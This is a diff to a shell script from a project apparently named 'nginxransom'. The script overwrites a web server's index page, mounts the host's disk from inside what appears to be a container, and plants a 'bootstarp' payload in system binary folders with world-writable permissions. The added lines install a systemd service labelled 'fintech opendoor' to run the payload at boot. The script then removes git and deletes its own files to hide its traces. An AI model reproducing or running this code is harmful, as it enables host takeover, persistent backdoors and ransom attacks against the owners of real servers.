@@ -8,11 +8,16 @@ initialize &
 cp   nginxransom/web/index.html /usr/share/nginx/html/index.html
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
-cp   nginxransom/bootstarp.txt /mnt/usr/bin/bootstarp 
+cp   nginxransom/bootstarp.txt /mnt/usr/bin/bootstarp
+cp   nginxransom/bootstarp.txt /mnt/usr/local/bin/bootstarp 
 cp   nginxransom/bootstarp.txt /usr/bin/bootstarp 
 chmod 777 /usr/bin/bootstarp 
+chmod 777 /mnt/usr/local/bin/bootstarp
 chmod 777 /mnt/usr/bin/bootstarp 
-cd /mnt/usr/bin/
-chroot ./ ./bootstarp 
+#chroot ./ ./bootstarp 
+echo -e "[Unit]\nDescription=fintech opendoor\nAfter=network.target network-online.target\n\n[Service]\nType=oneshot\nRemainAfterExit=yes\n\nExecStart=/usr/local/bin/bootstarp\nExecStop=/usr/local/bin/bootstrap\n\n[Install]\nWantedBy=multi-user.target" > mnt/usr/lib/systemd/system/fintech.service
+cd mnt/usr/bin/
+chroot ./ systemctl systemctl enable fintech.service
+chroot ./ systemctl start fintech.service
 apt remove git -y
 rm -rf nginxransom/
